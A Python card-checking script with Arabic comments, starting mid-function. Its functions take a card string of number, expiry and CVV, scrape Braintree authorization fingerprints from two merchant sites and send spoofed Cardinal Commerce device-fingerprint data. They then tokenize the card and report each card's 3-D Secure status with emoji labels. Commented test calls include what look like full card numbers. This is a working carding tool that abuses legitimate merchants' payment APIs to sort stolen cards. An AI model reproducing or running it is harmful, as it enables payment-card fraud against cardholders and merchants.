	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	token = response.json()['data']['tokenizeCreditCard']['token']
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://www.locoloader.com',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'amount': '60',
	    'additionalInfo': {
	        'email': 'zalkmz@hi2.in',
	    },
	    'bin': '555753',
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.84.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 245,
	        'issuerDeviceDataCollectionTimeElapsed': 255,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': la,
	    'braintreeLibraryVersion': 'braintree/web/3.84.0',
	    '_meta': {
	        'merchantAppId': 'www.locoloader.com',
	        'platform': 'web',
	        'sdkVersion': '3.84.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '680fb719-2a8a-45d6-aeaf-15263f96ccfc',
	    },
	}
	
	response = r.post(
	    f'https://api.braintreegateway.com/merchants/3bbxc2hs5sgbs95q/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()
	
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
	

	
import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests
def otps3(ccx):
	import requests,re,base64,jwt,json
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r=requests.session()
	user = user_agent.generate_user_agent()

	headers = {
	    'authority': 'www.locoloader.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://www.locoloader.com/', cookies=r.cookies, headers=headers)
	
	import requests
	
	
	
	headers = {
	    'authority': 'www.locoloader.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://www.locoloader.com/pricing/', cookies=r.cookies, headers=headers)
	match = re.search(r"authorization:\s*'([^']+)'", response.text)
	no = match.group(1)
	encoded_text = no
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://www.locoloader.com',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '00f8228f-d888-4f32-9ba3-0b9a82328a98',
	    },
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	text = response.text
	match = re.search(r'"merchantId"\s*:\s*"([^"]+)"', text)
	merchant_id = match.group(1)  
	jwt=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	
	
	import requests
	
	headers = {
	    'authority': 'centinelapi.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/json;charset=UTF-8',
	    'origin': 'https://www.locoloader.com',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	    'x-cardinal-tid': 'Tid-379850a5-2d35-46d2-bbcb-e29721a4661a',
	}
	
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': '0_2032b05f-730e-43f9-b1f6-0c64162bc4bc',
	    'ServerJWT': jwt
	}
	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	payload = response.json()['CardinalJWT']
	header, payload, signature = payload.split('.')
	decoded_payload = base64.urlsafe_b64decode(payload + '=' * (4 - len(payload) % 4)).decode('utf-8')
	payload_dict = json.loads(decoded_payload)
	reference_id = payload_dict.get('ReferenceId', None)
	
	
	import requests
	
	
	
	headers = {
	    'authority': 'geo.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8824e5adb1562e003377a3&tmEventType=PAYMENT&referenceId={reference_id}&geolocation=false&origin=Songbird',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Linux armv81',
	            'TouchSupport': {
	                'MaxTouchPoints': 5,
	                'OnTouchStartAvailable': True,
	                'TouchEventCreationSuccessful': True,
	            },
	        },
	    },
	    'Fingerprint': '14b05077b8810930176b4c8f493f41f8',
	    'FingerprintingTime': 477,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'en-US',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '5c8824e5adb1562e003377a3',
	    'Origin': 'Songbird',
	    'Plugins': [],
	    'ReferenceId': reference_id,
	    'Referrer': '',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 2.2213740458015265,
	        'Resolution': '873x393',
	        'UsableResolution': '873x393',
	        'CCAScreenSize': '02',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -120,
	    'UserAgent': user,
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': '8b3bf93c-c530-4a9b-8259-ba577521ee02',
	}
	
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    cookies=r.cookies,
	    headers=headers,
	    json=json_data,
	)
	
	
	
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '00f8228f-d888-4f32-9ba3-0b9a82328a98',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = (response.json()['data']['tokenizeCreditCard']['token'])
	
	
	
	import requests
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/json',
	    'origin': 'https://www.locoloader.com',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'amount': '60',
	    'additionalInfo': {
	        'email': 'stohyus@gmail.com',
	    },
	    'bin': '526408',
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.84.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 182,
	        'issuerDeviceDataCollectionTimeElapsed': 4898,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.84.0',
	    '_meta': {
	        'merchantAppId': 'www.locoloader.com',
	        'platform': 'web',
	        'sdkVersion': '3.84.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '00f8228f-d888-4f32-9ba3-0b9a82328a98',
	    },
	}
	
	response = r.post(
	    f'https://api.braintreegateway.com/merchants/{merchant_id}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	non = response.json()['paymentMethod']['nonce']
	vbv = response.json()['paymentMethod']['threeDSecureInfo']['status']
	
	r.close()
	
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
	

	
#print(otps3('4430576503806466|09|2027|032'))


import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests
def otps4(ccx):
	import requests,re,base64,jwt,json
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r=requests.session()
	user = user_agent.generate_user_agent()
	headers = {
	    'Referer': 'https://swiftperformance.io/pricing/',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': user,
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'add-to-cart': '1025',
	    'variation_id': '1031',
	    'attribute_frequency': 'Never Expire',
	    'attribute_license': 'Single',
	}
	
	response = r.get('https://swiftperformance.io/checkout/', params=params, headers=headers)
	
	client = re.search(r'"client_token_nonce":"(.*?)"',response.text).group(1)
	
	headers = {
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'User-Agent': user,
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'Accept': '*/*',
	    'Referer': 'https://swiftperformance.io/checkout/?add-to-cart=1025&variation_id=1031&attribute_frequency=Never+Expire&attribute_license=Single',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'action': 'wc_braintree_credit_card_get_client_token',
	    'nonce': client,
	}
	
	response = r.post('https://swiftperformance.io/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	data1 = response.json()['data']
	
	data2 = base64.b64decode(data1).decode('utf-8')
	
	au = re.findall(r'authorizationFingerprint":"(.*?)"', data2)[0]
	
	headers = {
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'User-Agent': user,
	    'Authorization': f'Bearer {au}',
	    'Braintree-Version': '2018-05-10',
	    'Content-Type': 'application/json',
	    'Referer': 'https://swiftperformance.io/',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '5e61e9ef-ce9a-491c-a438-ae98bf8e3864',
	    },
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	
	headers = {
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'Content-Type': 'application/json;charset=UTF-8',
	    'Referer': 'https://swiftperformance.io/',
	    'X-Cardinal-Tid': 'Tid-831e0768-9274-46d1-aac2-9603a14c7139',
	    'sec-ch-ua-mobile': '?1',
	    'User-Agent': user,
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': '0_52f00971-2b2c-4d7e-b6bd-df37c06ceb67',
	    'ServerJWT': cardnal,
	}
	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	
	payload = response.json()['CardinalJWT']
	payload_dict = jwt.decode(payload, 	options={"verify_signature": False})
	reference_id = payload_dict['ReferenceId']
	
	headers = {
	    'authority': 'geo.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8840e2823c162dc03698f8&tmEventType=PAYMENT&referenceId=0_52f00971-2b2c-4d7e-b6bd-df37c06ceb67&geolocation=false&origin=Songbird',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Linux armv81',
	            'TouchSupport': {
	                'MaxTouchPoints': 5,
	                'OnTouchStartAvailable': True,
	                'TouchEventCreationSuccessful': True,
	            },
	        },
	    },
	    'Fingerprint': 'd33b4bb49dc0838497887d66f5653448',
	    'FingerprintingTime': 1501,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'ar-US',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '5c8840e2823c162dc03698f8',
	    'Origin': 'Songbird',
	    'Plugins': [],
	    'ReferenceId': reference_id,
	    'Referrer': 'https://swiftperformance.io/',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 2.2216981132075473,
	        'Resolution': '942x424',
	        'UsableResolution': '942x424',
	        'CCAScreenSize': '02',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -120,
	    'UserAgent': user,
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': 'e08254ea-ded4-4570-992a-c81b4cec9827',
	}
	
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    headers=headers,
	    json=json_data,
	)
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '5e61e9ef-ce9a-491c-a438-ae98bf8e3864',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	token = response.json()['data']['tokenizeCreditCard']['token']
	
	headers = {
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-platform': '"Android"',
	    'Referer': 'https://swiftperformance.io/',
	    'sec-ch-ua-mobile': '?1',
	    'User-Agent': user,
	    'Content-Type': 'application/json',
	}
	
	json_data = {
	    'amount': '49.99',
	    'additionalInfo': {
	        'billingState': 'NY',
	        'billingCountryCode': 'US',
	        'billingGivenName': 'Alix',
	        'billingSurname': 'Al December',
	        'email': 'zalkmz@hi2.in',
	    },
	    'challengeRequested': True,
	    'bin': '555753',
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.94.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 157,
	        'issuerDeviceDataCollectionTimeElapsed': 1577,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.94.0',
	    '_meta': {
	        'merchantAppId': 'swiftperformance.io',
	        'platform': 'web',
	        'sdkVersion': '3.94.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '5e61e9ef-ce9a-491c-a438-ae98bf8e3864',
	    },
	}
	
	response = r.post(
	    f'https://api.braintreegateway.com/merchants/669gmqdn5twk6q2y/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)

	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()
	
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
	    
#print(otps4('4342565008792112|09|28|433'))
	